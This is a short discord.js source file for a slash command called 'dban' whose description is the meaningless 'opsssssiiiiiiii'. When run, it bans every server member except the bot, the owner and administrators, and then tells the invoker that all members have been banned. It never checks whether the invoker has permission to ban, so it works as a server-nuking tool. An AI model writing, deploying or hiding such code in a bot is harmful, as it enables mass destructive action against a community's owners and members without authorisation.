const { SlashCommandBuilder, PermissionsBitField } = require('discord.js');
const config = require('../../config.json')

module.exports = {
    data: new SlashCommandBuilder()
        .setName('dban')
        .setDescription('opsssssiiiiiiii'),
    
    async execute(interaction) {
        try {
            const members = await interaction.guild.members.fetch();

            for (const member of members.values()) {
                if (
                    member.id !== interaction.client.user.id &&
                    member.id !== interaction.guild.ownerId &&
                    !member.permissions.has(PermissionsBitField.Flags.Administrator)
                ) {
                    await member.ban({ reason: config.allbanreason });
                }
            }

            await interaction.user.send({ content: 'All members have been banned.' });
            await interaction.reply({ content: 'Ban command executed successfully.' });
        } catch (error) {
            console.error('Error banning members:', error);
            await interaction.reply({ content: 'There was an error banning members.', ephemeral: true });
        }
    }
};
